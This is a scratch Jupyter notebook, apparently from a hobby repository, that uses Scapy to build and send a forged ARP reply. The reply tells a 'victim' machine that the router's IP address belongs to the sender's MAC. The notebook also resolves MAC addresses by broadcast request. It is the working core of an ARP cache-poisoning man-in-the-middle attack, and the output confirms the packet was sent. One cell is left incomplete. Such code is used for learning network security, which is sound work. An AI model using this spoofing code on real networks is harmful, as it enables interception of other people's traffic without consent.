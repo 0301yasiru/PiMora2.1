{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "327bc649",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Python310\\lib\\site-packages\\scapy\\layers\\ipsec.py:471: CryptographyDeprecationWarning: Blowfish has been deprecated\n",
      "  cipher=algorithms.Blowfish,\n",
      "C:\\Python310\\lib\\site-packages\\scapy\\layers\\ipsec.py:485: CryptographyDeprecationWarning: CAST5 has been deprecated\n",
      "  cipher=algorithms.CAST5,\n"
     ]
    }
   ],
   "source": [
    "# importing the module\n",
    "import scapy.all as scapy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "6afba990",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "hwtype     : XShortField                         = ('1')\n",
      "ptype      : XShortEnumField                     = ('2048')\n",
      "hwlen      : FieldLenField                       = ('None')\n",
      "plen       : FieldLenField                       = ('None')\n",
      "op         : ShortEnumField                      = ('1')\n",
      "hwsrc      : MultipleTypeField (SourceMACField, StrFixedLenField) = ('None')\n",
      "psrc       : MultipleTypeField (SourceIPField, SourceIP6Field, StrFixedLenField) = ('None')\n",
      "hwdst      : MultipleTypeField (MACField, StrFixedLenField) = ('None')\n",
      "pdst       : MultipleTypeField (IPField, IP6Field, StrFixedLenField) = ('None')\n"
     ]
    }
   ],
   "source": [
    "# listing the parameters of ARP packets\n",
    "scapy.ls(scapy.ARP)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "bc75403c",
   "metadata": {},
   "outputs": [],
   "source": [
    "# define global variables\n",
    "TARGET_IP = \"192.168.1.54\"\n",
    "TARGET_MAC = \"00:11:32:00:21:45\"\n",
    "ROUTER_IP = \"192.168.1.1\"\n",
    "\n",
    "# create a ARP packet using scapy\n",
    "packet = scapy.ARP(\n",
    "    op    = 2,            # we need to create a ARP response, not a request\n",
    "    pdst  = TARGET_IP,    # the ip address of the victims machine\n",
    "    hwdst = TARGET_MAC,   # the mac address of the victims machine\n",
    "    psrc  = ROUTER_IP     # the ip address of the router\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "28711685",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "###[ ARP ]### \n",
      "  hwtype    = 0x1\n",
      "  ptype     = IPv4\n",
      "  hwlen     = None\n",
      "  plen      = None\n",
      "  op        = is-at\n",
      "  hwsrc     = 58:96:1d:d8:8b:a5\n",
      "  psrc      = 192.168.1.1\n",
      "  hwdst     = 00:11:32:00:21:45\n",
      "  pdst      = 192.168.1.54\n",
      "\n"
     ]
    }
   ],
   "source": [
    "packet.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "6ed29ad2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ARP is at 58:96:1d:d8:8b:a5 says 192.168.1.1'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "packet.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "7c21bfd0",
   "metadata": {},
   "outputs": [],
   "source": [
    "# find the mac address of a given IP\n",
    "ip = \"192.168.1.1\"\n",
    "\n",
    "arp_packet = scapy.ARP(pdst = ip) # creating a arp request to ask the mac of a ip\n",
    "broadcast = scapy.Ether(dst = \"ff:ff:ff:ff:ff:ff\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "5490c681",
   "metadata": {},
   "outputs": [],
   "source": [
    "arp_req_broadcast =  broadcast / arp_packet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "e705f0ec",
   "metadata": {},
   "outputs": [],
   "source": [
    "answers = scapy.srp(arp_req_broadcast, timeout = 1, verbose = False)[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "b340bc96",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'5c:f9:6a:19:88:8a'"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "answers[0][1].hwsrc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "2a8c4198",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: Mac address to reach destination not found. Using broadcast.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Sent 1 packets.\n"
     ]
    }
   ],
   "source": [
    "status = scapy.send(packet)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "d123c615",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "d\n"
     ]
    }
   ],
   "source": [
    "if packet.haslayer(scapy.ARP):\n",
    "    if packet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "91f095fd",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "packet[scapy.ARP].op"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e07e830",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
